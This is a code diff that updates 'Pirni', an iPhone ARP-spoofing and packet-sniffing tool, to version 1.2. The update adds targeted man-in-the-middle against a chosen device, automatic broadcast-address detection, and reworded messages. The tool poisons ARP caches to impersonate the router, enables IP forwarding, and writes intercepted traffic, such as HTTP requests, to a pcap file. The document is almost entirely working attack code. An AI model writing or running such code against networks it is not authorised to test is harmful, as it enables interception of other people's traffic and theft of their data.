@@ -1,16 +1,18 @@
-/* Pirni ARP poisoning and packet sniffing v1.1 -- n1mda, for the iPhone
-	compile with (arm-apple-darwin9-)gcc pirni.c -o pirni -lpcap -lnet -pthread */
-	
+/* Pirni ARP poisoning and packet sniffing -- n1mda, for the iPhone
+	compile with (arm-apple-darwin9-)gcc *.c -o pirni -lpcap -lnet -pthread */
+
 #include "pirni.h"
+
+#define VERSION 1.2
 
 void print_usage(char *name)
 {
-	printf("Pirni ARP Spoofer and packet sniffer v1.1\n\n");
-	printf("Usage:\t%s -s source_ip -b broadcast_ip -f [BPF_Filter] -o log.pcap\n", name);
-	printf("Ex:\t%s -s 192.168.0.1 -b 255.255.255.255 -f \"tcp dst port 80\" -o log.pcap\n", name);
+	printf("Pirni ARP Spoofer and packet sniffer %g\n\n", VERSION);
+	printf("Usage:\t%s -s source_ip -d [destination_ip] -f [BPF_Filter] -o log.pcap\n", name);
+	printf("Ex:\t%s -s 192.168.0.1 -d 192.168.0.128 -f \"tcp dst port 80\" -o log.pcap\n", name);
 	printf("Where:\t source_ip is the IP-adress you want to spoof, most likely the router\n");
-	printf("Where:\t broadcast_ip is the IP-adress for broadcasting packets. This changes from network to network but most common is 255.255.255.255\n");
-	printf("Where:\t [BPF_Filter] is the Berkley Packet Filter to only collect interesting packets. Read the userguide\n\n");
+	printf("Where:\t (OPTIONAL) [destination_ip] is the device you want to perform MITM on. Broadcast IP will be used if nothing else supplied.\n");
+	printf("Where:\t [BPF_Filter] is the Berkley Packet Filter to only collect interesting packets. Read the userguide.\n\n");
 	printf("You can later on transfer the dumpfile to your computer and open it with Wireshark (or any other packet analyzer that supports pcap) to analyze the traffic\n");
 	
 	return;
@@ -37,16 +39,13 @@ int main(int argc, char *argv[])
 		exit(1);
 	}
 	
-	while((c = getopt(argc, argv, "ds:b:f:o:")) != -1) {
+	while((c = getopt(argc, argv, "s:d:f:o:")) != -1) {
 		switch(c) {
-			case 'd':
-						//arpSpoof = FALSE;
-						break;
 			case 's':
 						routerIP = optarg;
 						SrcIP = inet_addr(optarg);
 						break;
-			case 'b':
+			case 'd':
 						DstIP = inet_addr(optarg);
 						break;
 			case 'f':
@@ -76,7 +75,7 @@ int main(int argc, char *argv[])
 	
 	device = "en0";
 	
-	printf("[+] Initializing packet forwarding: sysctl -w net.inet.ip.forwarding=1\n");
+	printf("[+] Initializing packet forwarding\n");
 	system("sysctl -w net.inet.ip.forwarding=1");
 	
 	signal(SIGINT, sigint_handler);
@@ -103,6 +102,34 @@ int main(int argc, char *argv[])
 		printf("[-] Could not parse your own MAC address: %s\n", libnet_geterror(l));
 		libnet_destroy(l);
 		return 0;
+	}
+
+	/* MOD :
+	 * Loop each device to find en0 and then get its broadcast address ;)
+	 * by evilsocket
+	 */
+	if(DstIP == 0)
+	{
+		pcap_if_t* devices;
+		if( pcap_findalldevs( &devices, errbuf ) == -1 ){
+			printf("[-] Couldn't enumerate devices (%s) .\n", errbuf);
+			exit(-1);
+		}
+		while( devices != NULL ){
+    		if( strcmp( devices->name, "en0" ) == 0 ){
+				pcap_addr_t *a = NULL;
+				for( a = devices->addresses; a; a = a->next ){
+					if( a->broadaddr ){
+						DstIP = ((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr;
+						printf( "[*] Your broadcast address: %s\n", inet_ntoa( *(struct in_addr *)&DstIP ) );
+						break;
+					}
+				}
+				break;
+			}
+			devices = devices->next;
+		}
+		pcap_freealldevs(devices);
 	}
 
 	/* Create ARP header */
@@ -143,7 +170,7 @@ int main(int argc, char *argv[])
 		exit(1);
 	}
 	
-	/* Send ARP request */
+	/* Send ARP response */
 
 	LaunchThread();
 	initSniffer(BPFfilter, outputFile);
@@ -154,7 +181,7 @@ int main(int argc, char *argv[])
 
 void sigint_handler(int sig)
 {
-	printf("[*] Removing packet forwarding: sysctl -w net.inet.ip.forwarding=0\n");
+	printf("\n[*] Removing packet forwarding\n");
 	system("sysctl -w net.inet.ip.forwarding=0");
 	
 	exit(0);
